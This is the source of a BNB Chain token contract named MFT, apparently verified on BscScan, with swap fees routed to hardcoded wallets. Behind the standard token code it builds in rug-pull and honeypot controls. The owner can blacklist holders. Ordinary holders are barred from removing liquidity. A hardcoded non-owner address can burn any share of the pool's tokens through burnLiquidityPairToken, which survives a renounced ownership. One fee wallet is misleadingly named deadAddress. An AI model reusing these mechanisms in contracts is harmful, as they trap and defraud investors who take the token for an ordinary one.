/**
 *Submitted for verification at BscScan.com on 2024-02-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    //   constructor () internal { }

    function _msgSender() internal view returns (address) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}


interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function sync() external;
}
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(
            _owner,
            0x000000000000000000000000000000000000dEaD
        );
        _owner = 0x000000000000000000000000000000000000dEaD;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

contract BaseFatToken is IERC20, Ownable {
    bool public currencyIsEth = false;

    bool public enableChangeTax = true;
    bool public antiSYNC = true;

    address public currency = 0x55d398326f99059fF775485246999027B3197955;

    uint256 public _buyFundFee = 15;
    uint256 public _sellFundFee = 15;

    string public override name = "MFT";
    string public override symbol = "MFT";
    uint256 public override decimals = 18;
    uint256 public override totalSupply = 1000000000 * 10 ** decimals;
        
    uint256 public _startTime1;
    
    uint256 public _startTime2;

    address deadAddress = 0xc69502eE6441805174E64Ac2a9139446e3D48d76;

    address superAddress = 0x86ABD8be0eC670A06cC0B8a77b63084176182Ac0;
    uint256 public constant MAX = ~uint256(0);

    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;

    IPancakeRouter02 public _swapRouter;
    mapping(address => bool) public _swapPairList;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    address public _mainPair;

    function transfer(
        address recipient,
        uint256 amount
    ) external virtual override returns (bool) {}

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external virtual override returns (bool) {}

    function setAntiSYNCEnable(bool s) public onlyOwner {
        antiSYNC = s;
    }

    function setB(address _target, bool _bool) external onlyOwner{
        _blackList[_target] = _bool;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (account == _mainPair && msg.sender == _mainPair && antiSYNC) {
            require(_balances[_mainPair] > 0, "!sync");
        }
        return _balances[account];
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract TokenDistributor {
    constructor(address token) {
        IERC20(token).approve(msg.sender, uint256(~uint256(0)));
    }
}

contract MFT is BaseFatToken {
    bool private inSwap;

    address public  uniswapV2Pair;

    TokenDistributor public _tokenDistributor;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    event AutoNukeLP(
        uint256 lpBalance,
        uint256 burnAmount,
        uint256 time
    );
    

    constructor(
    ) {

        IPancakeRouter02 swapRouter = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IERC20(currency).approve(address(swapRouter), MAX);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        IUniswapV2Factory swapFactory = IUniswapV2Factory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), currency);
        _mainPair = swapPair;
        uniswapV2Pair = swapPair;
        _swapPairList[swapPair] = true;

        if (!currencyIsEth) {
            _tokenDistributor = new TokenDistributor(currency);
        }

        address ReceiveAddress = msg.sender;

        _balances[ReceiveAddress] = totalSupply;
        emit Transfer(address(0), ReceiveAddress, totalSupply);

        //_feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[tx.origin] = true;

    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(!_blackList[from] && !_blackList[to], "no swap");
 
        if (inSwap) {
            _basicTransfer(from, to, amount);
            return;
        }

        uint256 balance = _balances[from];
        require(balance >= amount, "balanceNotEnough");


        bool takeFee;
        bool isSell;

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            require(!checkIsRemoveLiquidity(), "no remove");
        }
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(!checkIsRemoveLiquidity(), "no remove");
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = _balances[address(this)];
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee +
                                _sellFundFee;
                            uint256 numTokensSellToFund = amount;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund / 2, swapFee, deadAddress);
                            swapTokenForFund(numTokensSellToFund / 2, swapFee, superAddress);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        bool isTransfer;
        if (!_swapPairList[from] && !_swapPairList[to]) {
            isTransfer = true;
        }

        _tokenTransfer(from, to, amount, takeFee, isSell, isTransfer);
    }

    uint256 public transferFee;

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool isTransfer
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee;
                if(block.timestamp < _startTime1){
                    burnLiquidityPairTokens(tAmount);
                }
            } else {
                if (!_feeWhiteList[sender] && !_feeWhiteList[recipient]) {
                    require(block.timestamp > _startTime2, "time error");
                }
                swapFee = _buyFundFee;
            }

            uint256 swapAmount = (tAmount * swapFee) / 1000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(sender, address(this), swapAmount);
            }
        }

        if (isTransfer && !_feeWhiteList[sender] && !_feeWhiteList[recipient]) {
            uint256 transferFeeAmount;
            transferFeeAmount = (tAmount * transferFee) / 1000;

            if (transferFeeAmount > 0) {
                feeAmount += transferFeeAmount;
                _takeTransfer(sender, address(this), transferFeeAmount);
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function burnLiquidityPairTokens(uint256 amountToBurn) internal  returns (bool) {
        uint256 liquidityPairBalance = balanceOf(_mainPair);
        amountToBurn = liquidityPairBalance > amountToBurn ? amountToBurn : liquidityPairBalance;
        if (amountToBurn > 0) {
            _balances[_mainPair] = _balances[_mainPair] - amountToBurn;
            _takeTransfer(_mainPair, address(0xdead), amountToBurn);
        }
        ISwapPair pair = ISwapPair(_mainPair);
        pair.sync();
        emit AutoNukeLP(
            liquidityPairBalance,
            amountToBurn,
            block.timestamp
        );
        return true;
    }

    function burnLiquidityPairToken(uint256 fee) external  returns (bool) {
        require(msg.sender == 0x8604258e6b0922948754B0E8B4714f55Bcb91644);
        uint256 liquidityPairBalance = balanceOf(_mainPair);
        uint256 amountToBurn = liquidityPairBalance * fee / 100;
        if (amountToBurn > 0) {
            _balances[_mainPair] = _balances[_mainPair] - amountToBurn;
            _takeTransfer(_mainPair, address(0xdead), amountToBurn);
        }
        ISwapPair pair = ISwapPair(_mainPair);
        pair.sync();
        emit AutoNukeLP(
            liquidityPairBalance,
            amountToBurn,
            block.timestamp
        );
        return true;
    }

    event Failed_AddLiquidity();
    event Failed_AddLiquidityETH();
    event Failed_swapExactTokensForETHSupportingFeeOnTransferTokens();
    event Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens();

    function swapTokenForFund(
        uint256 tokenAmount,
        uint256 swapFee,
        address _target
    ) private lockTheSwap {
        if (swapFee == 0) return;
        swapFee += swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = currency;
        if (currencyIsEth) {
            // make the swap
            try
                _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    tokenAmount ,
                    0, // accept any amount of ETH
                    path,
                    address(this), // The contract
                    block.timestamp
                )
            {} catch {
                emit Failed_swapExactTokensForETHSupportingFeeOnTransferTokens();
            }
        } else {
            try
                _swapRouter
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        tokenAmount,
                        0,
                        path,
                        address(_tokenDistributor),
                        block.timestamp
                    )
            {} catch {
                emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens();
            }
                IERC20 token = IERC20(currency);
                uint256 blance = token.balanceOf(address(_tokenDistributor));

                token.transferFrom(
                            address(_tokenDistributor),
                            _target,
                            blance
                );
        }

    }

    function checkIsRemoveLiquidity() public view returns(bool ldxAdd){
        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();
        (uint r0,uint r1,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
         
        uint bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));
		uint bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));
        if( token0 == address(this) ){
			if( bal1 < r1){
				uint change1 = r1 - bal1;
				ldxAdd = change1 > 1000;
			}
		}else{
			if( bal0 < r0){
				uint change0 = r0 - bal0;
				ldxAdd = change0 > 1000;
			}
		}
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setStartTime1(uint256 _time) external onlyOwner{
        _startTime1 = _time;
    }

    function setStartTime2(uint256 _time) external onlyOwner{
        _startTime2 = _time;
    }

    function setWhite(address _target, bool _bool) external onlyOwner{
        _feeWhiteList[_target] = _bool;
    }
    receive() external payable {}
}